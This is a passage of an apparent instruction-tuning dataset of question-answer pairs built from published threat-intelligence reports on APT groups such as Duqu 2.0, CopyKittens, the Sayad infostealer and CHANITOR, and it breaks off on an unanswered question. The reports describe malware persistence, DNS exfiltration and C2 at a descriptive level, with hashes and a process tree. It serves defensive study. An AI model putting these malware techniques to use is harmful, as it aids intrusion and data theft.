    "output": "The GhostNet investigation revealed the extent of cyber espionage activities through a combination of fieldwork, technical scouting, and laboratory analysis. The investigation discovered a network of over 1,295 infected hosts in 103 countries, with up to 30% of these hosts being high-value targets such as ministries of foreign affairs, embassies, international organizations, news media, and NGOs. The attackers gained access to potentially sensitive information by compromising Tibetan computer systems with multiple infections, providing them with unprecedented access.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 9 Conclusion\nThe Ukrainian Government currently finds itself at a tactical disadvantage vis-\u00e0-vis Russia, both on the traditional field of battle and in cyberspace. However, cyber security, especially at the national level, is a strategic game, and Kyiv can make smart investments that will pay off over the long run.\nCyber security, especially at the national level, is a strategic game.\nThis chapter has argued for the need to apply strategic thought to digital defence. It began by advocating the utility of a military model in cyberspace, albeit without any desire for the militarisation of cyberspace. The author explained how the military mind set, based on conflict with dynamic, adaptive adversaries, is a more reliable strategy than the popular 'cyber hygiene' model. It then described the five levels of strategic thought, which link goals with policy, strategy, campaigns and operations, tactics, and tools. The author applied each level of strategic thought to a hypothetical network defence scenario. By integrating strategic thought into digital defence, this chapter demonstrated an alternative to technology-centric approaches that are not sufficient to defeat the adversary.\nIn a time of war, Ukraine is a natural target for many cyber threat actors and campaigns. The only way to counter them is to develop an equally determined defensive posture in cyber space.\nAnswer this question: Why is it essential for Ukraine to adopt a military mindset in its approach to cybersecurity, particularly in the context of its ongoing conflict with Russia? How does this mindset differ from the 'cyber hygiene' model, and what are the key levels of strategic thought that should be integrated into digital defense?",
    "output": "Adopting a military mindset in cybersecurity is crucial for Ukraine because it involves preparing for conflict with dynamic, adaptive adversaries, which is more effective than the 'cyber hygiene' model. The military mindset focuses on conflict scenarios and strategic planning, whereas the 'cyber hygiene' model primarily emphasizes basic security practices. The key levels of strategic thought that should be integrated into digital defense include goals, policy, strategy, campaigns and operations, tactics, and tools. This structured approach helps in developing a comprehensive and proactive defense posture that goes beyond merely reacting to threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background\nPreviously we described activity by the same actor \" (<https://www.proofpoint.com/us/threat-insight/post/PlugX-in-Russia>)In Pursuit of Optical Fibers and Troop Intel \" [2] in which this group utilized PlugX malware to target various telecommunication and military interests in Russia. Since January 2016, this group switched to using NetTraveler and varied its targets, but otherwise left most of its tools, techniques, and procedures (TTPs) unchanged. It is worth noting that this and other China-based espionage groups have reduced their reliance on PlugX for unknown reasons, with only a few major incidents involving PlugX this year [5].\nMoreover, there are some indications that this or a closely related group utilized Saker, Netbot, DarkStRat, and LURK0 Gh0st in its espionage activities. We previously mentioned this in our 2015 publication on PlugX. Palo Alto Networks also demonstrated links via tools and infrastructure used in these attacks in their (<http://researchcenter.paloaltonetworks.com/2016/01/nettraveler-spear-phishing-email-targets-diplomat-of-uzbekistan/>)MNKit [4] research, as did Kaspersky [1] and ESET [3] in their respective publications.\nAnswer this question: Why did the APT group behind the NetTraveler campaign switch from using PlugX malware to NetTraveler, and what implications does this shift have for understanding the evolution of their tactics, techniques, and procedures (TTPs)?",
    "output": "The APT group switched from using PlugX malware to NetTraveler starting in January 2016. This change was part of a broader trend among China-based espionage groups reducing their reliance on PlugX for unknown reasons, with only a few major incidents involving PlugX that year. Despite this shift in malware, the group maintained most of its TTPs unchanged. This indicates that while the specific tools may evolve, the underlying methodologies and strategies remain consistent. Understanding this shift helps cybersecurity experts recognize that APT groups often adapt their toolsets to avoid detection and maintain effectiveness, highlighting the importance of monitoring for changes in malware usage while remaining vigilant about consistent TTPs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: SIMILARITIES BETWEEN DUQU AND DUQU 2.0\nThe 2014/2015 Duqu 2.0 is a greatly enhanced version of the 2011 Duqu malware discovered by 7CrySyS Lab. It includes many new ideas from modern malware, such as Regin, but also lateral movement strategies and harvesting capabilities which surpasses commonly seen malware from other APT attacks.\nSide by side:\nThere are many similarities in the code that leads us to conclusion that Duqu 2.0 was built on top of the original source code of Duqu. Those interested can read below for a technical description of these similarities.\n7\nOne of the \"trademark\" features unique to the original Duqu was the set of functions that provide logging facilities. Unlike many other APTs, Duqu logs almost every important step of its activity but does it in a special way: there are no readable strings written to the log. Instead, a series of unique numbers identify every state, error, or message in the log. Comparing the functions that generate every log entry in Duqu and Duqu 2.0, we can conclude that they are almost identical:\nThe first generation of Duqu was also written in a very rare and unique manner. It was compiled with Visual Studio and while parts of it were definitely written in C++, the majority of its classes were not natively generated by the C++ compiler. After analyzing all the possible variants, we conclude that these classes were written in OO-C, the objective variant of the C language, and then somehow converted into a compilable C/ C++ source. All these classes had a very specific feature: the virtual function table of every instance was filled \"by hand\" in its constructor. Interestingly, this is no longer the case for Duqu 2.0. The authors upgraded their compiler from Visual Studio 2008 (used in 2011) to Visual Studio 2013 and now use classes that look much more like native C++ ones:\nOn the left: the \"hand-made\" or \"compiler-assisted\" classed of OO-C in Duqu.  On the right: the same class in Duqu 2.0 has a native Vtable similar to native C++ one, however the offset of the pointer is not zero.\nThe more concrete evidence of similarity can be found if we look for functions that actually use the logging facilities. The authors kept using the same unique numbers for identification of internal states, errors and function results. Networking functions are good candidates for comparison:\nImplementation of the same networking function in Duqu and Duqu 2.0. Note the same unique numbers (in red rectangles) PUSHed as parameters to the logging function.\nAnother networking routine: after calling recv() to receive data from network, Duqu logs the results and possible network errors (obtained via WSAGetLastError()). Unique numbers in red rectangles are used to identify the current state of the networking routine.\nThe code of the orchestrator evolved in many aspects since 2011. One of the notable differences is a huge list of HTTP User-Agent strings that are now used instead of a single hard-coded one:\nThe authors also modified the \"magic\" two-byte value that identifies encrypted network traffic: \"SH\" was replaced with a more neutral and harder to trace \"WW\":\nCode that verifies the \"magic\" value in network traffic.\nThe chars are swapped due to little-endianness of data in x86/64 architectures.\nBoth Duqu and Duqu 2.0 use special structures to identify the interfaces of their plugins. The orchestrator also has one for the \"core\" plugin that is compiled in its code. The newer version has a slightly bigger table, hence more functions, and a different notation for describing the plugin features. Special strings (i.e. \"A888A8>@\") describe each function's signature. The older Duqu had contained similar strings in binary (unreadable) form.\nData structure that describes the \"core\" plugin of Duqu and two different version of Duqu 2.0.  Note the same constants and similar functions.\nThe Duqu C&C code makes use of small image files to hide its communications over unencrypted channels, i.e. HTTP. The original Duqu used a JPEG file, and known versions of Duqu 2.0 use a similar JPEG file as well as a new, larger GIF file. Also, the layout of the data section did not change much: the image data is preceded by short AES encryption keys (string \"sh123456\" in Duqu, two binary DWORDs in Duqu 2.0) followed by the LZO version string \"2.03\".\nImage data used for hiding C&C communication in them: JPEG in Duqu, similar JPEG in Duqu 2.0 and GIF in a different version of Duqu 2.0. Note the preceding LZO version string \"2.03\" and encryption keys.\nThe large number of similarities between the Duqu 2011 code and the new Duqu 2.0 samples indicates that the new code represents a new iteration of the malware platform. The new version could not have been built without access to the 2011 Duqu source code. Hence, we conclude that the authors are the same or working together.\n\nQuestion: How does the logging mechanism in Duqu and Duqu 2.0 differ from other APTs, and what specific features indicate that Duqu 2.0 was built on top of the original Duqu source code?\n\nAnswer:",
    "output": "The logging mechanism in Duqu and Duqu 2.0 differs from other APTs by using a series of unique numbers to identify every state, error, or message instead of readable strings. This unique logging system is one of the key indicators that Duqu 2.0 was built on top of the original Duqu source code. Additionally, the functions that generate log entries in both versions are almost identical, further supporting this conclusion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Targetting\nCopyKittens is an active cyber espionage actor whose primary focus appears to be foreign espionage on strategic targets. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks.\nFor example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel.\nVictims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments. Fake Facebook profiles have been used for spreading malicious links and building trust with targets. Some of the profiles have been active for years.\nMedium Headline: Malware\nCopyKittens use several self-developed malware and hacking tools that have not been publicly reported to date, and are analyzed in this report: TDTESS backdoor; Vminst, a lateral movement tool; NetSrv, a Cobalt Strike loader; and ZPP, a files compression console program. The group also uses Matryoshka v1, a self-developed RAT analyzed by ClearSky in the 2015 report, and Matryoshka v2 which is a new version, albeit with similar functionality.\nThe group often uses the trial version of Cobalt Strike3 , a publicly available commercial software for \"Adversary Simulations and Red Team Operations.\" Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, \"a PowerShell and Python post-exploitation agent.\" For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap.\nA notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration. This feature is available both in Cobalt Strike and in Matryoshka.\nMost of the infrastructure used by the group is in the U.S., Russia, and The Netherlands. Some of it has been in use for more than two years.\n3\nBig Headline: Targeting\nBased on Trend Micro Telemetry, incident response engagements, and open source threat intelligence investigations, we have learned of CopyKittens target organizations and countries. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees.\nTargeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks.\nFor example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel.\nBased on the size of the attack infrastructure and length of the campaign, we estimate that there have been at least a few hundred people infected in multiple organizations in the targeted countries.\nAfter infecting a computer within a target organization, the attacker would move latterly using one of the malware descried in chapter \"Malware.\" It seems that their objective is to gather as much information and data from target organizations as possible. They would indiscriminately exfiltrate large amounts of documents, spreadsheets, file containing personal data, configuration files and databases.\nIn at least one case, the attackers breached an IT company, and used VPN access it had to client organizations to breach their networks.\nOften, victim organizations would learn of the breach due to the non-stealthy behavior of the attackers. The attackers would \"get greedy,\" infecting multiple computers within the network of breached organizations. This would raise an alarm in various defense systems, making the victims initiate incident response operations.\n\nWhy does CopyKittens use DNS for command and control communication and data exfiltration? What advantages does this method provide over traditional communication channels?",
    "output": "A: CopyKittens uses DNS for command and control communication and data exfiltration because it provides several advantages over traditional communication channels. DNS traffic is generally allowed through firewalls and is less likely to be blocked or monitored, making it a stealthier method for communicating with compromised systems. Additionally, DNS queries can be used to encode and transmit small amounts of data, allowing the group to exfiltrate information without raising suspicion. This method leverages the ubiquity and reliability of DNS to maintain persistent and covert communication with their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Sayad (Flying Kitten) Infostealer \u2013 is this the work of the Iranian Ajax Security Team?\nInformation stealing malware has become increasingly popular among malware authors targeting not just typical end-users, but also specific organizations and states. We have come across an intriguing piece of malware (dubbed Sayad) that implements multiple host data collection methods and wraps them up into a single .NET DLL. Sayad malware is typically distributed through phishing emails.\nBig Headline: Analysis\nOur first step was to run the \"Sayad\" binary through our Vinsula Execution Engine to find out just what it does. The process tree below as reported by our engine allows us to visually present the parent/child relationship between all the processes and their command lines related to the execution for this specific malware.\nexplorer.exe [Process Id: 140]\n+ WEXTRACT.exe [Process Id: 3508]\n+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]\n+ rundll32.exe [Process Id: 2596]\nCmd line: rundll32.exe \"DiagnosticsService.dll\",78121\n+ csc.exe [Process Id: 2672]\n+ cvtres.exe [Process Id: 256]\n+ csc.exe [Process Id: 3548]\n+ cvtres.exe [Process Id: 3280]\nFor the sake of shortness, in this post we omit the command line details in the process tree above for the csc.exe and cvtres.exe instances. For the same reason, we also don't show the complete command line of the rundll32.exe. Because this is an important detail, here is how it shows up in our Vinsula malware report:\nrundll32.exe \"C:\\Users\\[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\",78121\nSayad malware is a self-contained executable that embeds within itself all the required malicious components, meaning that it doesn't need to download any additional malicious content from the C2 server, which may appear suspicious.\nIts three core components are structured as \"Russian Dolls,\" i.e., one wrapped within the next in layers. Here is the list with the key components starting from the outermost one. Hashes of all investigated components are provided at the end of this post.\nSelf-extracting executable (WEXTRACT.exe)\nBinder (~8f60957b3689075fa093b047242c0255.exe)\nClient (DiagnosticsService.dll)\nFurther down, I will go into greater detail and provide more information about the behavior and static building blocks of each of these components. For now, I am just aiming to capture the scope of each executable involved in the orchestration of the Sayad malware.\nAs we can see in the cascade tree above, the main malware WEXTRACT.exe is a self-extracting executable which extracts the Binder ~8f60957b3689075fa093b047242c0255.exe, and it then launches it. The Binder is responsible for checking the installed .NET version and extracting the relevant .NET Client \u2013 DiagnosticsService.dll. This .NET DLL implements the data collecting logic and sends the collected data to the C2 server. The following diagram captures a bit more of the detail of the malware workflow.\nThe main self-extracting binary WEXTRACT.exe drops two files in the user's appdata temp directory as shown in the following entries from our Vinsula report. These two files are the two parts of the Binder \u2013 a .NET executable (~8f60957b3689075fa093b047242c0255.exe) and its configuration file (~8f60957b3689075fa093b047242c0255.exe.config). Details along with snippets from Binder's source code are provided in the next sections.\n+ WEXTRACT.exe [Process Id: 3508]\nCreate[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe] Delete[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe]\nOpen[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe] Write[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe] Create[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]\nDelete[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]\nOpen[C:\\Users\\\n[User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]\nWrite[C:\\Users\\ [User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config]\nHere is the hashes of the Binder:\nFilename : ~8f60957b3689075fa093b047242c0255.exe\nMD5 : 72641dedb31280b78bf6a0f184ef29b6\nSHA1 : 69fd05ca3a7514ea79480d1dbb358fab391e738d\nThis is what the two files dropped by the self-extracting malware look like in Windows Explorer. They are stored in a temporary location C:\\Users\\[User]\\AppData\\Local\\Temp\\IXP000.TMP.\nAfter dropping the Binder and its configuration file, the main self-extracting binary launches the Binder (~8f60957b3689075fa093b047242c0255.exe). Similar to the process tree from our Vinsula report above, the below screenshot from Process Explorer shows the Binder being launched by the self-extracting binary.\nThe purpose of the Binder is to create and drop the core malware component (also titled Client \u2013 DiagnosticsService.dll) and its configuration disguised as a DLL file, base.dll. Below is a snippet from our Vinsula report capturing the relevant event entries that show the Client and its configuration being created.\n+ WEXTRACT.exe [Process Id: 3508]\n+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]\nCreate [C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll]\nWrite [C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll]\nCreate [C:\\Users\\\n[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll]\nWrite [C:\\Users\\\n[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll]\nThese are the hashes of the two core Client related files:\nFilename : DiagnosticsService.dll\nMD5 : 432a79f8f1402cb2622b27e26e900d55\nSHA1 : 8521eefbf7336df5c275c3da4b61c94062fafdda\nFilename : base.dll\nMD5 : 4a67b19c02d5cfdebcd85b7395d09881\nSHA1 : 082da03918039125dcf1f096a13ffa9ab6a56bde\nBefore digging into the details of the Client, lets have a look at the Binder's\n(~8f60957b3689075fa093b047242c0255.exe) implementation. The Binder is a .NET executable whose purpose is to find out what version of .NET is currently installed, and then drop the relevant .NET Client DLL accordingly. There are two versions of the Client DLL that are stored as embedded resources in Binder's executable. That makes the malware less chattier and allows it to drop the correct .NET version DLL without the need to download it from a malicious Web location.\nAs shown in the above screenshot, in the Binder's main entry point, the Sayad malware:\ngets the installed .NET versions\nmodifies the registry so that it will run at startup using rundll32.exe Windows utility to load the Client\nAnswer this question: How does the Sayad (Flying Kitten) malware ensure that it remains persistent on the infected system, and what role does the Binder component play in this process?",
    "output": "The Sayad malware ensures persistence by modifying the registry so that it runs at startup. Specifically, it uses the rundll32.exe Windows utility to load the Client component (DiagnosticsService.dll). The Binder component plays a crucial role in this process by checking the installed .NET versions on the system and then dropping the relevant .NET Client DLL accordingly. This ensures that the malware can execute its data collection logic without needing to download additional components from a remote server, making it less detectable.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CHANITOR Overlaps\nMandiant has not responded to any intrusions where we have directly observed CHANITOR malware lead to COLDDRAW ransomware; however, we have identified overlaps between CHANITOR-related operations and COLDDRAW incidents. These include infrastructure overlaps, common code signing certificates, use of a shared packer, and naming similarities for domains, files, and URL paths, among others.\nThe code signing certificate with the Common Name FDFWJTORFQVNXQHFAH has been used to sign COLDDRAW payloads, as well as SENDSAFE payloads distributed by CHANITOR. Mandiant has not observed the certificate used by other threat actors.\nCOLDDRAW payloads and SENDSAFE payloads distributed by CHANITOR have used a shared packer that we refer to as . LONGFALL, which is also known as CryptOne, has been used with a variety of malware families.\nThe WICKER stealer has been used in both CHANITOR-related post-exploitation activity and COLDDRAW incidents, including samples sharing the same command and control (C&C) server.\nPayloads distributed through CHANITOR and payloads identified in COLDDRAW ransomware incidents have masqueraded as the same legitimate applications including mDNSResponder and Java.\nBig Headline: Implications\nAs the number of vulnerabilities identified and publicly disclosed continues to increase year after year, Mandiant has also observed an increase in the use of vulnerabilities as an initial compromise vector by ransomware threat actors including utilizing both zero-day and n-day vulnerabilities in their activity; notable examples include (<https://www.mandiant.com/resources/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat>)UNC2447 and . Shifting towards vulnerabilities for initial access could offer threat actors more accurate targeting and higher success rates when compared to malicious email campaigns, which rely more on uncontrollable factors, such as victims' interacting with malicious links or documents. The rise in zero-day usage specifically could be reflective of significant funds and resources at the disposal of ransomware operators, which are being directed towards exploit research and development or the purchasing of exploits from trusted brokers. However, threat actors do not have to use zero-days to be effective. A subset of n-day vulnerabilities are often considered attractive targets for threat actors due to their impact of publicly exposed products, ability to facilitate code execution after successful exploitation, and the availability of significant technical details and/or exploit code in public venues. As the number of vulnerabilities publicly disclosed continues to rise, we anticipate threat actors, including ransomware operators, to continue to exploit vulnerabilities in their operations.\nBig Headline: Mandiant Security Validation\nIn addition to previously released Actions, the Mandiant Security Validation (Validation) Behavior Research Team (BRT) has created VHR20220223, which will also be released today, for tactics associated with UNC2596.\nA102-561, Malicious File Transfer - TERMITE, Download, Variant #3\nA102-560, Malicious File Transfer - TERMITE, Download, Variant #4\nA102-559, Command and Control - TERMITE, DNS Query, Variant #1\nA102-558, Malicious File Transfer - WEDGECUT, Download, Variant #1\nA102-557, Malicious File Transfer - TERMITE, Download, Variant #2\nA102-556, Malicious File Transfer - TERMITE, Download, Variant #1\nA102-555, Malicious File Transfer - BURNTCIGAR, Download, Variant #4\nA102-554, Malicious File Transfer - BURNTCIGAR, Download, Variant #3\nA102-553, Malicious File Transfer - BURNTCIGAR, Download, Variant #2\nA102-552, Malicious File Transfer - BURNTCIGAR, Download, Variant #1\nA102-572, Malicious File Transfer - BUGHATCH, Download, Variant #4\nA102-551, Malicious File Transfer - BUGHATCH, Download, Variant #3\nA102-550, Malicious File Transfer - BUGHATCH, Download, Variant #2\nA102-549, Malicious File Transfer - BUGHATCH, Download, Variant #1\nA101-830 Command and Control - COLDDRAW, DNS Query\nA101-831 Malicious File Transfer - COLDDRAW, Download, Variant #2\nA101-832 Malicious File Transfer - COLDDRAW, Download, Variant #3\nA101-833 Malicious File Transfer - COLDDRAW, Download, Variant #4\nA101-834 Malicious File Transfer - COLDDRAW, Download, Variant #5\nA101-835 Malicious File Transfer - COLDDRAW, Download, Variant #6\nA104-800 Protected Theater - COLDDRAW, Execution\nA151-079 Malicious File Transfer - COLDDRAW, Download, Variant #1\nA100-308 Malicious File Transfer - CHANITOR, Download\nA100-309 Command and Control - CHANITOR, Post System Info\nA150-008 Command and Control - CHANITOR, Check-in and Response\nA150-047 Malicious File Transfer - CHANITOR, Download, Variant #2\nA150-306 Malicious File Transfer - CHANITOR, Download, Variant #1\nBig Headline: YARA Signatures\nThe following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. These rules are intended to serve as a starting point for hunting efforts to identify samples, however, they may need adjustment over time if the malware family changes.\nrule TERMITE\n\nQ: What are the implications of the overlaps between CHANITOR-related operations and COLDDRAW incidents, as identified by Mandiant?",
    "output": "A: The overlaps between CHANITOR-related operations and COLDDRAW incidents, such as shared infrastructure, common code signing certificates, use of a shared packer, and naming similarities, suggest a potential link or collaboration between the two. These overlaps could indicate that the same threat actor or closely related groups are involved in both operations. Understanding these connections can help cybersecurity experts better attribute attacks and develop more effective defense strategies against both CHANITOR and COLDDRAW threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: You've Got Malice\nRussian nationalists waged a cyber war against Georgia. Fighting back is virtually impossible.\nOn July 20, weeks before Russia stunned Georgia with a rapid invasion, the cyber attack was already under way. While Moscow baited Georgia with troop movements on the borders of the breakaway provinces of Abkhazia and South Ossetia, the \"zombie\" computers were already on the attack. Russian viruses had seized hundreds of thousands of computers around the world, directing them to barrage Georgian Web sites, including the pages of the president, the parliament, the foreign ministry, news agencies and banks, which shut down their servers at the first sign of attack to pre-empt identity theft. At one point the parliament's Web site was replaced by images comparing Georgian president Mikheil Saakashvili to Adolf Hitler. This was not\nthe first Russian cyber assault\u2014that came against Estonia, in April of 2007\u2014but it was the first time an Internet attack paralleled one on land.\nThe labyrinthine ways of the Web and the complicated interfaces between the Russian government's clandestine services and organized crime make it impossible, at this point, to say with certainty who was responsible, or how far up the chain of command it went. The Russian military certainly had the means to attack Georgia's Internet infrastructure, says Jonathan Zittrain, cofounder of Harvard's Berkman Center for Internet and Society. Moreover, the attacks were too successful to have materialized independent of one another. Bill Woodcock, the research director at Packet Clearing House, a California-based nonprofit group that tracks Internet security trends, says the attacks bear the markings of a \"trained and centrally coordinated cadre of professionals.\"\nBut who? Jart Armin, who has tracked Russian cybercrime, points to the possibility that a role was played by the notorious Russian Business Network, a cybermafia that specializes in identity theft, child pornography, extortion and other dark and lucrative Internet crimes. The RBN's political agenda is vague or nonexistent, but it often contracts out its services, and Armin says there is increasing evidence that it is connected to, or at least tolerated by, the Kremlin.\nIndeed the timing is such that it's hard to discount some sort of Kremlin coordination, even if it's impossible to prove, and Woodcock argues that such cyber assaults have become a tool of Russian political leadership. As the attacks' political intentions became more specific, he notes, the operations have grown more complex. In addition to targeting Georgian government and media Web sites, Russian hackers brought down the Russian newspaper Skandaly.ru, apparently for expressing some pro-Georgian sentiment. \"This was the first time that they ever attacked an internal and an external target as part of the same attack,\" he says.\nFighting back is tough. When Russian hackers made a name for themselves last year by bringing down the Web site of the Estonian parliament along with the sites of banks, ministries and newspapers, Estonian Foreign Minister Urmas Paet immediately accused the Kremlin of backing the attacks. But he was unable to produce evidence supporting his claims. Putin eventually named a suspect, or scapegoat, within his government. As Russian hackers waged a similar assault on Georgian sites over the past few weeks, Estonia\u2014one of Europe's most wired countries\u2014offered its better-defended servers to host many Georgian government Web sites. Lithuania and Poland have stepped up as well, prompting some excited bloggers to suggest that this is a digital Sarajevo, akin to the events of August 1914, the start of the first Internet world war. Certainly that's exaggerated, but the mutual defense going on in cyberspace shows that these nations take the Russian threat to their online infrastructure seriously.\nStill, the nature of the Internet is such that it is almost impossible to respond quickly enough. The government doesn't maintain its own botnets\u2014large networks of zombified computers standing ready to attack\u2014but can rent one\nfrom a crime network, like the Russian Business Network. Then, through state-controlled media, the government can inspire waves of nationalists to amplify the destructive force. \"Everybody with a laptop has the responsibility to attack the enemy\u2014and you find out who the enemy is by looking at what the government is saying,\" Woodcock says.\nWhile no one can say who wrote the malware that was used to cause Georgian servers to crash, it certainly proliferated on Russian Web sites in a user-friendly form. Gary Warner, a cybercrime expert at the University of Alabama at Birmingham, says he found \"copies of the attack script\" posted in the reader comments section at the bottom of virtually every story in the Russian media that covered the Georgian conflict, complete with instructions on how the script could be used to attack a specific list of Web sites. The efficiency is enough to make Russia's tanks and planes and ships, however deadly, appear downright anachronistic.\nMedium Headline: Experts call for united global action against cyber attacks\nThe world has to unite against the growing menace of cyber terrorism, IT experts said Thursday, evoking a recent \"cyber war\" against Georgia as the latest example of the threat.\n\"The world has finally woken up and understood that cyber security needs a global approach and is a very serious matter,\" Estonian politician Mart Laar told a cyber security forum in the Estonian capital Tallinn.\nEstonia had to deal with attacks on government websites blamed on Russian hackers in the spring of 2007.\nOfficial Georgian websites suffered a similar cyber offensive last month in the wake of Russia's military offensive on Georgian soil. Estonia was among several states that stepped in to host hacked Georgian websites.\n\"The cyber war against Georgia in August demonstrated how it has become part of the real war on the ground and we must act,\" Laar added.\nAccording to Laar, cyber attacks against the Georgian websites came a day ahead of Russia's August 8 military action in the country, a move roundly condemned in the West.\nRobert Kramer, vice-president of public policy for CompTIA, the Computing Technology Industry Association uniting the world's top IT firms, underscored that global cyber security starts at home with the average Internet user.\n\"The weakest link in cyber space is the human being behind the computer with not enough awareness and skills on IT security matters,\" Kramer told the forum.\nHeli Tiirmaa-Klaar, an IT expert with Estonia's defence ministry, repeated the warning.\n\"People everywhere need to understand that your unprotected computer at home can be used as a tool in cyber-war,\" she said.\nTim Boerner, an IT security expert with the US Secret Service, said experts noted increased attacks on Georgian web sites weeks before the first bombs fell on Georgia.\n\"Over one million computers worldwide were used during the cyber attacks against Estonia in spring 2007,\" he added.\nAn ex-Soviet republic that broke free from Moscow in 1991, the tiny Baltic Sea state of Estonia joined the European Union and NATO in 2004.\nIt has become a leader in global IT development and has focused heavily on cyber security since suffering the wave of cyber attacks in early 2007.\n\nWhat strategies were employed by the attackers to mobilize a large number of participants in the cyberattacks on Georgia, and how did these strategies exploit the nature of the internet?",
    "output": "The attackers employed several strategies to mobilize a large number of participants in the cyberattacks on Georgia, effectively exploiting the nature of the internet. One key strategy was the use of botnets\u2014large networks of compromised computers controlled remotely to launch attacks. These botnets could be rented from criminal networks like the Russian Business Network (RBN). Additionally, the attackers leveraged state-controlled media to inspire waves of nationalists to join the attack. Instructions and attack scripts were widely distributed on Russian websites, often found in the reader comments sections of news stories covering the Georgian conflict. These scripts were user-friendly and included specific lists of websites to target. By making the attack tools easily accessible and promoting a sense of patriotic duty, the attackers were able to mobilize a significant number of individuals to participate in the cyber offensive. This approach made traditional military assets seem outdated in comparison to the efficiency and reach of cyber warfare.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nAs the conflict has continued on the ground and in cyberspace, Trident Ursa has been operating as a dedicated access creator and intelligence gatherer. Trident Ursa remains one of the most pervasive, intrusive, continuously active and focused APTs targeting Ukraine.\nGiven the ongoing geopolitical situation and the specific target focus of this APT group, Unit 42 researchers continue to actively monitor for indicators of their operations. In doing so, we have mapped out over 500 new domains, 200 samples and other Indicators of Compromise (IoCs) used within the past 10 months that support Trident Ursa's different phishing and malware purposes.\nWe are providing this update along with  to highlight and share our current overall understanding of Trident Ursa's operations.\nWhile monitoring these domains as well as open source intelligence, we have identified multiple items of note:\nAn unsuccessful attempt to compromise a large petroleum refining company within a NATO member nation on Aug. 30.\nAn individual who appears to be involved with Trident Ursa threatened to harm a Ukraine-based cybersecurity researcher immediately following the initial invasion.\nMultiple shifts in their tactics, techniques and procedures (TTPs).\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products including , , (<https://www.paloaltonetworks.com/network-security/advanced-url-filtering>)Advanced URL Filtering,  and (<https://www.paloaltonetworks.com/network-security/dns-security>)DNS Security subscription services for the .\nTargeting Beyond Ukraine\nBeyond Just Hacking: Open Threats to Cybersecurity Community\nDNS Shenanigans\nBypassing DNS Through Legitimate Web Services\nBypassing DNS Through a Messaging Service\nHiding True IP Assignment Through Separate IPs for Root Domain and Subdomains\nVarious Malware Types Used\nPhishing Using HTML Files\nPhishing Using Word Documents\nRecently Seen Droppers\n7ZSfxMod_x86.exe\nMyfile.exe\nConclusion\nProtections and Mitigations\nIndicators of Compromise\nAdditional Resources\n\nQuestion: How does Trident Ursa's evolving tactics, techniques, and procedures (TTPs) reflect its adaptability in the cyber threat landscape, and what implications does this have for cybersecurity professionals aiming to protect against similar APT groups?\n\nAnswer:",
